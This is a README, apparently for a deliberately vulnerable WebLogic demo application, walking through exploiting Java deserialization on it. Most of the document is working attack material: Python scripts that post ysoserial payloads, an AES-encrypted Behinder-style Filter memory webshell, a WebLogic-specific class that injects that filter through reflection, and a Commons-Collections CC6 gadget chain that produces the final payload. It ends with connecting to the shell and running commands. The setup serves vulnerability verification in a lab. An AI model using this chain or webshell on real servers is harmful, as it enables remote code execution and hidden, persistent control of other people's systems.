# weblogic-web-application
web application demo by weblogic

它存在一个反序列化漏洞，用于做相关漏洞验证

There is a deserialization vulnerability, which is used to verify related vulnerabilities:CC5、CC6, etc


@[toc]

# 背景
一个基于weblogic的web应用，如果它有反序列化漏洞，可以试试下面这条路

# 环境搭建


安装weblogic，参考[链接](https://blog.csdn.net/weixin_40102675/article/details/88180647)
idea 创建一个web application项目，application server 后面再加，或者用idea打开我的demo项目[myWebApp](https://github.com/5wimming/myWebApp.git)
![在这里插入图片描述](https://img-blog.csdnimg.cn/44d54f0ba20b42099126c83c8ae05ead.png)
edit configurations
![在这里插入图片描述](https://img-blog.csdnimg.cn/c37e4d04f3b84d21bf63b4a84e687de1.png)
增加war exploded
![在这里插入图片描述](https://img-blog.csdnimg.cn/5cd5c65ad7cf4e9c9bf465037de03a40.png)
运行项目
![在这里插入图片描述](https://img-blog.csdnimg.cn/36fb04d109914fb08a2775a6308c8b4c.png)
# 反序列化漏洞
可以直接打，需使用ysoserial，会弹出计算器：

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# @Date    : 2022/05/09
# @Author  : 5wimming
import requests
import subprocess
import time
import base64

def origin_yso(pds):
    for payload in pds:
        cmd = 'open /System/Applications/Calculator.app'
        if 'URLDNS' in payload:
            cmd = 'http://' + cmd.split(' ')[1]
        yso_args = ['java',
                    '-jar',
                    './tools/ysoserial/ysoserial-0.0.6-SNAPSHOT-all.jar',
                    payload,
                    cmd]
        try:
            p = subprocess.Popen(yso_args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            out, err = p.communicate()
            print(payload, yso_args)
            burp0_headers = {
                "User-Agent": "Mozilla/6.0 (Macintosh; rv:81.0) Firefox/81.0",
                "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.4",
                "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8",
                "Connection": "close"}
            r = requests.post('http://localhost:7001/myWebApp_war_exploded/hi', headers=burp0_headers, data=out, verify=False, timeout=20)
            print(r.text)
            time.sleep(3)
        except Exception as e:
            print(e)



if __name__ == '__main__':
    payloads = ["CommonsBeanutils5", "CommonsBeanutils6"]
    origin_yso(payloads)
```
# Filter内存马
首先基于冰蝎实现filter内存马

```java
package com.payload.desc;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;

public class WebloglcFilter implements Filter {

    @Override
    public void destroy() {

    }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {

        try {
            if(((HttpServletRequest)request).getMethod().equals("POST")){

                HttpSession session = ((HttpServletRequest)request).getSession();
                String k = "e45e329feb5d925b";
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                HashMap map = new HashMap();
                map.put("request", request);
                map.put("response", response);
                map.put("session", session);

                //取classloader
                byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
                ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
                java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try{
                    uclass = cl.loadClass("U");
                }catch(ClassNotFoundException e){
                    uclass  = (Class)define.invoke(cl,bytecode,0,bytecode.length);
                }

                Constructor constructor =  uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g",byte[].class);
                Um.setAccessible(true);

                //冰蝎payload
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class) Um.invoke(u,evilClassBytes);
                Object a = evilclass.newInstance();
                Method b = evilclass.getDeclaredMethod("equals",Object.class);
                b.setAccessible(true);
                b.invoke(a, map);
                return;

            }
        }catch(Exception ex){
            ex.printStackTrace();

        }
        chain.doFilter(request, response);

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    public static void main(String[] args) {

    }
}

```
将WebloglcFilter编译后的class转换成字节码
```java
public static void main(String[] args) {
        try{
            File file = new File("./WebloglcFilter.class");
            FileInputStream fileInputStream = new FileInputStream(file);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] bytes = new byte[4096];
            int len;
            while ((len = fileInputStream.read(bytes))!=-1){
                byteArrayOutputStream.write(bytes,0,len);
            }
            String encode = new BASE64Encoder().encode(byteArrayOutputStream.toByteArray());
            System.out.println(encode.replaceAll("\\r|\\n",""));
        }catch (Exception e){
            e.printStackTrace();
        }
    }
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a0ba9b3c4e444435a5998b52b7b40d97.png)
将WebloglcFilter.class的字节码作为输入，基于weblogic相关上下文的具体payload实现：

```java
package com.payload.desc;

import sun.misc.BASE64Decoder;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.WebAppServletContext;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class WeblogicImpl extends AbstractTranslet {

    public WeblogicImpl() {
        super();


        Thread thread = Thread.currentThread();
        try {
            //获取WebAppServletContext
            Field workEntry = Class.forName("weblogic.work.ExecuteThread").getDeclaredField("workEntry");
            workEntry.setAccessible(true);
            Object workentry = workEntry.get(thread);
            WebAppServletContext webAppServletContext=null;
            try{ //weblogic 12.1.3
                Field connectionHandler = workentry.getClass().getDeclaredField("connectionHandler");
                connectionHandler.setAccessible(true);
                Object http = connectionHandler.get(workentry);

                Field request1 = http.getClass().getDeclaredField("request");
                request1.setAccessible(true);
                ServletRequestImpl servletRequest = (ServletRequestImpl) request1.get(http);

                Field context = servletRequest.getClass().getDeclaredField("context");
                context.setAccessible(true);
                webAppServletContext = (WebAppServletContext) context.get(servletRequest);

            }catch (Exception e){
                //weblogic 1036
                Field context = workentry.getClass().getDeclaredField("context");
                context.setAccessible(true);
                webAppServletContext = (WebAppServletContext) context.get(workentry);
            }
            if(webAppServletContext==null){throw new Exception("null");}
            //加载WebloglcFilter的字节码
            String encode_class = "yv66vgAAADQBBwoAJgCEBwCFCwACAIYIAIcKAIgAiQsAAgCKCACLCABaCwCMAI0IAI4KAI8AkAcAkQoAiACSCgAMAJMKAI8AlAcAlQoAEACECABjCgAQAJYIAGUIAEgKAJcAmAgAmQoAmgCbCgCcAJ0KAJwAngoAJgCfCgAeAKAIAKEHAKIHAFEJAKMApAoAHgClCgCmAKcIAKgKACkAqQcAqgcAqwoAowCsCgCmAK0HAK4KAB4ArwoAsACnCgAeALEKALAAsggAswcAtAoALwCECwC1ALYKALcAuAoALwC5CgCPALoKAB4AuwgAvAcAvQoANwC+CwC/AMAHAMEHAMIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIUxjb20vcGF5bG9hZC9kZXNjL1dlYmxvZ2xjRmlsdGVyOwEAB2Rlc3Ryb3kBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAFlAQAiTGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAAWsBABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQADbWFwAQATTGphdmEvdXRpbC9IYXNoTWFwOwEACGJ5dGVjb2RlAQACW0IBAAJjbAEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAGZGVmaW5lAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZ1Y2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAC2NvbnN0cnVjdG9yAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAAXUBABJMamF2YS9sYW5nL09iamVjdDsBAAJVbQEADmV2aWxDbGFzc0J5dGVzAQAJZXZpbGNsYXNzAQABYQEAAWIBAAJleAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEADVN0YWNrTWFwVGFibGUHAMEHAMMHAMQHAMUHAMYHAMcHAMgHAJUHAK4HAMkHAKIHAKoHAL0BAApFeGNlcHRpb25zBwDKBwDLAQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABNXZWJsb2dsY0ZpbHRlci5qYXZhDAA8AD0BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DADMAM0BAARQT1NUBwDHDAC8AM4MAM8A0AEAEGU0NWUzMjlmZWI1ZDkyNWIHAMYMANEA0gEAA0FFUwcAyAwA0wDUAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwA1QDWDAA8ANcMAHoA2AEAEWphdmEvdXRpbC9IYXNoTWFwDADZANoHANsMANwA3wECZHl2NjZ2Z0FBQURRQUdnb0FCQUFVQ2dBRUFCVUhBQllIQUJjQkFBWThhVzVwZEQ0QkFCb29UR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzcFZnRUFCRU52WkdVQkFBOU1hVzVsVG5WdFltVnlWR0ZpYkdVQkFCSk1iMk5oYkZaaGNtbGhZbXhsVkdGaWJHVUJBQVIwYUdsekFRQURURlU3QVFBQll3RUFGMHhxWVhaaEwyeGhibWN2UTJ4aGMzTk1iMkZrWlhJN0FRQUJad0VBRlNoYlFpbE1hbUYyWVM5c1lXNW5MME5zWVhOek93RUFBV0lCQUFKYlFnRUFDbE52ZFhKalpVWnBiR1VCQUFaVkxtcGhkbUVNQUFVQUJnd0FHQUFaQVFBQlZRRUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUMyUmxabWx1WlVOc1lYTnpBUUFYS0Z0Q1NVa3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0FJUUFEQUFRQUFBQUFBQUlBQUFBRkFBWUFBUUFIQUFBQU9nQUNBQUlBQUFBR0tpdTNBQUd4QUFBQUFnQUlBQUFBQmdBQkFBQUFBZ0FKQUFBQUZnQUNBQUFBQmdBS0FBc0FBQUFBQUFZQURBQU5BQUVBQVFBT0FBOEFBUUFIQUFBQVBRQUVBQUlBQUFBSktpc0RLNzYzQUFLd0FBQUFBZ0FJQUFBQUJnQUJBQUFBQXdBSkFBQUFGZ0FDQUFBQUNRQUtBQXNBQUFBQUFBa0FFQUFSQUFFQUFRQVNBQUFBQWdBVAcA4AwA4QDiBwDjDADkAOUMAOYA5wwA6ADpDADqAOkBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcA6wwA7ABXDADtAO4HAMkMAO8A8AEAAVUMAPEA8gEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAQamF2YS9sYW5nL09iamVjdAwA8wD0DAD1APYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMAPcA+AcA+QwA+gDnDAD7APwBAAFnAQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgcAwwwA/QD+BwD/DAEAAM0MAQEA4gwBAgEDDAD7AQQBAAZlcXVhbHMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAEFAD0HAMUMAEQBBgEAH2NvbS9wYXlsb2FkL2Rlc2MvV2VibG9nbGNGaWx0ZXIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAAlnZXRNZXRob2QBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBAAdEZWNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEADWdldFN1cGVyY2xhc3MBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEADmdldENsYXNzTG9hZGVyAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAB2RvRmluYWwBAAYoW0IpW0IBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQA6ACYAAQA7AAAABQABADwAPQABAD4AAAAvAAEAAQAAAAUqtwABsQAAAAIAPwAAAAYAAQAAAA0AQAAAAAwAAQAAAAUAQQBCAAAAAQBDAD0AAQA+AAAAKwAAAAEAAAABsQAAAAIAPwAAAAYAAQAAABIAQAAAAAwAAQAAAAEAQQBCAAAAAQBEAEUAAgA+AAADdgAGABMAAAGZK8AAArkAAwEAEgS2AAWZAXgrwAACuQAGAQA6BBIHOgUZBBIIGQW5AAkDABIKuAALOgYZBgW7AAxZGQW2AA0SCrcADrYAD7sAEFm3ABE6BxkHEhIrtgATVxkHEhQstgATVxkHEhUZBLYAE1e4ABYSF7YAGDoIuAAZtgAaOgkZCbYAG7YAHLYAHLYAHBIdBr0AHlkDEh9TWQSyACBTWQWyACBTtgAhOgoZCgS2ACIBOgsZCRIjtgAkOgunACo6DBkKGQkGvQAmWQMZCFNZBAO4ACdTWQUZCL64ACdTtgAowAAeOgsZCwS9AB5ZAxIpU7YAKjoMGQwEtgArGQwEvQAmWQMqtgAbtgAsU7YALToNGQsSLgS9AB5ZAxIfU7YAIToOGQ4EtgAiGQa7AC9ZtwAwK7kAMQEAtgAytgAztgA0Og8ZDhkNBL0AJlkDGQ9TtgAowAAeOhAZELYANToRGRASNgS9AB5ZAxImU7YAIToSGRIEtgAiGRIZEQS9ACZZAxkHU7YAKFexpwAKOgQZBLYAOC0rLLkAOQMAsQACALAAuQC8ACUAAAGFAYkANwADAD8AAACSACQAAAAXABEAGQAcABoAIAAbACsAHAAyAB0ARgAfAE8AIABYACEAYQAiAGsAJQB1ACYAfQAnAKcAKACtACkAsAArALkALgC8ACwAvgAtAOMAMADzADEA+QAyAQ4AMwEgADQBJgA3AUAAOAFVADkBXAA6AW4AOwF0ADwBhQA9AYYAQwGJAEABiwBBAZAARAGYAEYAQAAAANQAFQC+ACUARgBHAAwAHAFqAEgASQAEACABZgBKAEsABQAyAVQATABNAAYATwE3AE4ATwAHAHUBEQBQAFEACAB9AQkAUgBTAAkApwDfAFQAVQAKALAA1gBWAFcACwDzAJMAWABZAAwBDgB4AFoAWwANASAAZgBcAFUADgFAAEYAXQBRAA8BVQAxAF4AVwAQAVwAKgBfAFsAEQFuABgAYABVABIBiwAFAGEAYgAEAAABmQBBAEIAAAAAAZkAYwBkAAEAAAGZAGUAZgACAAABmQBnAGgAAwBpAAAASQAF/wC8AAwHAGoHAGsHAGwHAG0HAG4HAG8HAHAHAHEHAB8HAHIHAHMHAHQAAQcAdSb/AKIABAcAagcAawcAbAcAbQAAQgcAdgYAdwAAAAYAAgB4AHkAAQB6AHsAAgA+AAAANQAAAAIAAAABsQAAAAIAPwAAAAYAAQAAAEsAQAAAABYAAgAAAAEAQQBCAAAAAAABAHwAfQABAHcAAAAEAAEAeQAJAH4AfwABAD4AAAArAAAAAQAAAAGxAAAAAgA/AAAABgABAAAATwBAAAAADAABAAAAAQCAAIEAAAACAIIAAAACAIMA3gAAAAoAAQCaAJcA3QAJ";
            byte[] decode_class = new BASE64Decoder().decodeBuffer(encode_class);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            //这里为了适配weblogic 1036 必须反射获取webAppServletContext中的classLoader
            Field loader = webAppServletContext.getClass().getDeclaredField("classLoader");
            loader.setAccessible(true);
            ClassLoader ClassLoader0= (ClassLoader) loader.get(webAppServletContext);
            Class filter_class = (Class) defineClass.invoke(ClassLoader0, decode_class, 0, decode_class.length);

            //获取ChangeAwareClassLoader，因为cachedClasses这个变量在ChangeAwareClassLoader中
            Field classLoader = webAppServletContext.getClass().getDeclaredField("classLoader");
            classLoader.setAccessible(true);
            ClassLoader classLoader1 = (ClassLoader) classLoader.get(webAppServletContext);
            //获取cachedClasses
            Field cachedClasses = classLoader1.getClass().getDeclaredField("cachedClasses");
            cachedClasses.setAccessible(true);
            Object cachedClasses_map = cachedClasses.get(classLoader1);
            Method get = cachedClasses_map.getClass().getDeclaredMethod("get", Object.class);
            get.setAccessible(true);
            //如果cachedClasses中不存在cmdFilter类
            if (get.invoke(cachedClasses_map, "cmdFilter") == null) {
                //把cmdFilter的class 存入cachedClasses中
                Method put = cachedClasses_map.getClass().getMethod("put", Object.class, Object.class);
                put.setAccessible(true);
                put.invoke(cachedClasses_map, "cmdFilter", filter_class);
                //获取filterManager类
                Field filterManager = webAppServletContext.getClass().getDeclaredField("filterManager");
                filterManager.setAccessible(true);
                Object o = filterManager.get(webAppServletContext);
                //注册Filter
                Method registerFilter = o.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilter.setAccessible(true);
                registerFilter.invoke(o, "test", "cmdFilter", new String[]{"/*"}, null, null, null);
            }
        } catch (Exception e) {

        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) {
        System.out.println("weblogic");
    }
}

```
基于cc6链生成最终payload

```java
package com.payload.desc;


import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;


public class CC6Template {
    public static void main(String[] args) throws Exception {

        byte[] bytes = getBytes();

        // 反射修改属性以及调用方法
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_name", "F4DE");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 先设置一个无害方法，防止在 Map#put 方法中触发Gadget
        Transformer invokerTransformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);

        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.clear();
        // 反射修改 iMethodName 字段为 newTransformer
        setFieldValue(invokerTransformer, "iMethodName", "newTransformer");

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc6.ser"));
        outputStream.writeObject(expMap);
        outputStream.close();

        // ======反序列化======
        ByteArrayOutputStream barr_out = new ByteArrayOutputStream();
        ObjectOutputStream ops = new ObjectOutputStream(barr_out);
        ops.writeObject(expMap);
        ops.close();

        // ======序列化=======
        ByteArrayInputStream barr_in = new ByteArrayInputStream(barr_out.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(barr_in);
        ois.readObject();
        ois.close();
        barr_in.close();
    }

    static void setFieldValue(Object obj, String field, Object value) throws Exception {
        Class<?> clazz = Class.forName(obj.getClass().getName());
        Field field1 = clazz.getDeclaredField(field);
        field1.setAccessible(true);
        field1.set(obj, value);
    }

    public static byte[] getBytes() throws IOException {
        InputStream inputStream = new FileInputStream(new File("./WeblogicImpl.class"));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}

```
# do it

这里通过python发包办它

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# @Date    : 2022/05/09
# @Author  : 5wimming
import requests
import subprocess
import time
import base64

def send_local_ser():
    out = open('./cc6.ser', 'rb').read()
    try:
        burp0_headers = {
            "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8",
            "Connection": "close"}
        r = requests.post('http://localhost:7001/myWebApp_war_exploded/hi', headers=burp0_headers, data=out,
                          verify=False, timeout=10)
        print(r.text)
        time.sleep(3)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    send_local_ser()
```
使用冰🦀️蝎连接
![在这里插入图片描述](https://img-blog.csdnimg.cn/629e765e2cdf451a9c6512fe3c082f89.png)

执行命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/8b1d60a1d41e4e60b313b0c8e6c91270.png)


参考：
https://www.cnblogs.com/nice0e3/p/14956677.html
https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/
https://www.modb.pro/db/375028
